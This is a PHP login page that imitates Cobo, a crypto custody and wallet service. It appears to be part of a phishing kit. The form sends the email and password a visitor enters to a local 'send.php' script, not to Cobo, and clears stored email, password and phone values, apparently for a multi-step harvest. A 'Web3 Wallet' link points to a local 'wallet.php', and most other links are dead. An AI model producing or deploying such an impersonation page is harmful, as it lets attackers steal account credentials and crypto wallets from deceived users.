<?php include_once './config.php';?>
<html lang="en">
    <?php
        unset($_SESSION['email']);
        unset($_SESSION['password']);
        unset($_SESSION['phone_number']);
    
        $title = 'Cobo | Your trusted partner for custody and wallet infrastructure solutions';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class='container-fluid'>
            <div class="row justify-content-center">
                <div class='col-sm-4 rounded-4 p25 mt30 bg-white' style="border: 1px #edf2f9 solid">
                    <h1 class='h6 mobile_web_font fw-bold pt10 text-center'>Log In</h1>
                    <form method="post" action="<?= base_url('send.php')?>" class="">
                        <div class="my20">
                            <label class="form-label fw-semibold">Email</label>
                            <input name="email" type="email" required="" class="form-control form-control-add" placeholder="Enter your email address" />
                        </div>
                        <div class="my20">
                            <label class="form-label fw-semibold">Password</label>
                            <input name="password" type="password" required="" class="form-control form-control-add" placeholder="Enter your Password" />
                        </div>
                        <div class="my20 text-end">
                            <a href="#" class='text-primary-2 text-decoration-none fs16 fw-semibold'>Forgot Password</a>
                        </div>
                        <div class="d-grid my20">
                            <button type="submit" class="btn btn-success btn-primary-2 py10 btn-lg" >Log In</button>
                        </div>
                        <div class='row my20'>
                            <div class='col-sm-12 text-center fs13 lh22 text-secondary'>
                                By logging in, you agree to our <a class="text-decoration-none" href="https://www.cobo.com/policy/terms" target="_blank">Cobo Account General Terms and Conditions </a> and confirm that you have read and agree to our <a class="text-decoration-none" href="https://www.cobo.com/policy/privacy" target="_blank">Privacy Policy</a>.
                            </div>
                        </div>
                        <div class="row">
                            <div class='col-sm-12 mt10 text-center border-top' style="position: relative">
                                <span class="text-secondary px10 bg-white" style="position: absolute; bottom:-10px">or</span>
                            </div>
                            <div class='col-sm-12 my30 d-grid'>
                                <a href="<?= base_url('wallet.php')?>" class="btn btn-primary-3 text-start"><i class="fa-solid fa-wallet text-primary-2 fs16 px10"></i> Web3 Wallet </a>
                                <a href="#" class="btn btn-primary-3 mt20 text-start"><i class="fa-solid fa-laptop-medical text-primary-2 fs16 px10"></i> Gaurd </a>
                                <a href="#" class="btn btn-primary-3 mt20 text-start"><i class="fa-solid fa-key text-primary-2 fs16 px10"></i> PassKey </a>
                            </div>
                            <div class='col-sm-12 text-center mt30'>
                                No account yet? <a class="text-decoration-none ps3" href="#" target="_blank"> Sign Up</a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>